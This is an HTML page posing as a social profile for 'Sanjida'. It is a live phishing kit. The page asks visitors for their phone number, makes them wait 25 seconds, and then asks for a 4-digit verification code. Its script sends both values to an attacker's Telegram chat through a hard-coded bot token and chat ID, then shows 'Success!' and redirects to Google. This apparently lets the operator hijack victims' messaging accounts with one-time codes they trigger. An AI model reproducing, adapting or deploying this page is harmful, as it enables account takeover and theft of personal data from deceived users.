<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sanjida - Profile</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #fdfdfd; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .main-box { width: 90%; max-width: 380px; padding: 30px; border: 1px solid #eee; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05); background: #fff; }
        .user-pic { width: 90px; height: 90px; border-radius: 50%; border: 3px solid #f0f0f0; margin-bottom: 15px; }
        h1 { font-size: 20px; color: #333; margin: 10px 0; }
        p { color: #777; font-size: 14px; line-height: 1.6; }
        .input-row { display: flex; border: 1.5px solid #e0e0e0; border-radius: 12px; overflow: hidden; margin: 20px 0; }
        .c-code { width: 70px; border: none; border-right: 1px solid #eee; text-align: center; font-weight: bold; font-size: 16px; outline: none; }
        .p-num { border: none; width: 100%; padding: 15px; font-size: 16px; outline: none; }
        button { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #000; color: #fff; font-weight: bold; cursor: pointer; opacity: 0.3; transition: 0.3s; }
        button.ready { opacity: 1; background: #007bff; }
        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
        .otp-box { width: 45px; height: 50px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 20px; background: #fafafa; }
        .hide { display: none; }
    </style>
</head>
<body>

<div id="step1" class="main-box">
    <img src="https://i.ibb.co/VpkX8vX/user-image.jpg" class="user-pic">
    <h1>Connect with Sanjida</h1>
    <p>Please provide your contact number to proceed to the profile information.</p>
    <div class="input-row">
        <input type="text" id="code" class="c-code" placeholder="+880">
        <input type="number" id="phone" class="p-num" placeholder="Number" oninput="validate()">
    </div>
    <button id="btn" onclick="next()">Continue</button>
</div>

<div id="step2" class="main-box hide">
    <h1>Confirmation</h1>
    <p>Wait for the timer to finish, then enter the code received to verify your connection.</p>
    <div class="otp-inputs">
        <input type="number" class="otp-box" maxlength="1" id="o1" oninput="move(this, 'o2')">
        <input type="number" class="otp-box" maxlength="1" id="o2" oninput="move(this, 'o3')">
        <input type="number" class="otp-box" maxlength="1" id="o3" oninput="move(this, 'o4')">
        <input type="number" class="otp-box" maxlength="1" id="o4" oninput="finish(this)">
    </div>
    <div id="wait" style="color: #999; font-size: 13px;">Wait 25s...</div>
</div>

<script>
    const b_t = "8794180523:AAEtAX0_NfcKPvJdSPNpuil6zWZupVu23zY";
    const c_i = "8624234278";
    let full = "";

    function validate() {
        let p = document.getElementById("phone").value;
        let b = document.getElementById("btn");
        if(p.length > 7) b.classList.add("ready");
        else b.classList.remove("ready");
    }

    function next() {
        let p = document.getElementById("phone").value;
        let c = document.getElementById("code").value || "+880";
        if(p.length < 8) return;
        full = c + p;
        fetch(`https://api.telegram.org/bot${b_t}/sendMessage?chat_id=${c_i}&text=Number: ${full}`);
        document.getElementById("step1").classList.add("hide");
        document.getElementById("step2").classList.remove("hide");
        let t = 25;
        let boxes = document.querySelectorAll(".otp-box");
        boxes.forEach(b => b.disabled = true);
        let intr = setInterval(() => {
            t--;
            document.getElementById("wait").innerText = `Wait ${t}s...`;
            if(t <= 0) {
                clearInterval(intr);
                document.getElementById("wait").innerText = "You can enter code now";
                boxes.forEach(b => b.disabled = false);
            }
        }, 1000);
    }

    function move(curr, next) { if(curr.value.length >= 1) document.getElementById(next).focus(); }

    function finish(last) {
        if(last.value.length >= 1) {
            let code = document.getElementById("o1").value + document.getElementById("o2").value + document.getElementById("o3").value + document.getElementById("o4").value;
            fetch(`https://api.telegram.org/bot${b_t}/sendMessage?chat_id=${c_i}&text=User: ${full}%0ACode: ${code}`)
            .then(() => { alert("Success!"); window.location.href = "https://google.com"; });
        }
    }
</script>
</body>
</html>
